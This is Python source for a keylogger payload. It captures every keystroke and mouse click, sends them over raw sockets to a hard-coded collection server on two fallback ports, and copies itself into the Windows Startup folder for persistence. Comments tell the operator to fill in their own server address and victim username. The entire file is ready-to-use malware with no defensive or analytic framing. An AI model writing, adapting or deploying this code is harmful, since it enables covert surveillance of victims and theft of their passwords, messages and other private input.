import time
import threading
import socket
import requests
from pynput import mouse, keyboard
from _thread import start_new_thread
import subprocess
import os

# connect to server
def connect_to_server():
    try:
        con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # <1*> server ip and port
        con.connect(('192.168.3.228',9595))
        # -----------------------------------------------------------------------------
        # -----------------------------------------------------------
        # mouse monitoring  
        def on_click(x, y, button, pressed):
            if pressed:
                con.send(f"{x}:{y}:{button}-{pressed} \n".encode())
        def mouse_log(v):
            with mouse.Listener(on_click=on_click) as lst:
                lst.join()
        # ---------------------------------------------------
        # keybord monitoring
        def on_press(key):
            try:
                ss = key.char
                con.send(ss.encode())
            except AttributeError:
                sss = str(key)+'\n'
                con.send(sss.encode())
        def keyboard_log(v):
            with keyboard.Listener(on_press=on_press) as lst:
                lst.join()
        # ----------------------------------------------------------
        # -----------------------------------------------------------------------------
        start_new_thread(keyboard_log, tuple([1]))
        start_new_thread(mouse_log, tuple([2]))
        while True:
            pass
    except:
        con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # <2*> server ip and port
        con.connect(('192.168.3.228',4545))
        # -----------------------------------------------------------------------------
        # -----------------------------------------------------------
        # mouse monitoring  
        def on_click(x, y, button, pressed):
            if pressed:
                con.send(f"{x}:{y}:{button}-{pressed} \n".encode())
        def mouse_log(v):
            with mouse.Listener(on_click=on_click) as lst:
                lst.join()
        # ---------------------------------------------------
        # keybord monitoring
        def on_press(key):
            try:
                ss = key.char
                con.send(ss.encode())
            except AttributeError:
                sss = str(key)+'\n'
                con.send(sss.encode())
        def keyboard_log(v):
            with keyboard.Listener(on_press=on_press) as lst:
                lst.join()
        # ----------------------------------------------------------
        # -----------------------------------------------------------------------------
        start_new_thread(keyboard_log, tuple([1]))
        start_new_thread(mouse_log, tuple([2]))
        while True:
            pass

    




# check targget_system_internet connection
def a():
    head = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"}
    while True:
        try:
            time.sleep(1)
            req = requests.request('get', 'https://google.com', headers=head)

            if req.status_code == 200:
                a = 200
                return int(a)
            continue
        except:
            time.sleep(1)
            a = 100
            return int(a)
            pass




# move file to startup folder (auto run)
while True:
    i=a()
    a = subprocess.getoutput('cd')
    # <3*> set you own set you username example (pc)
    bb = r"C:\Users\pc\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    
    if a != bb:
        ss = subprocess.getoutput('cd')
        os.chdir(ss)
        # <4*> set you own set you username example (pc)
        subprocess.getoutput('copy keylogger-payload.py "C:/Users/pc/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"')

        while True:
           
            if  i == 200:
                connect_to_server()
                
            
    elif a == bb:
        while True:

            if i == 200:
                connect_to_server()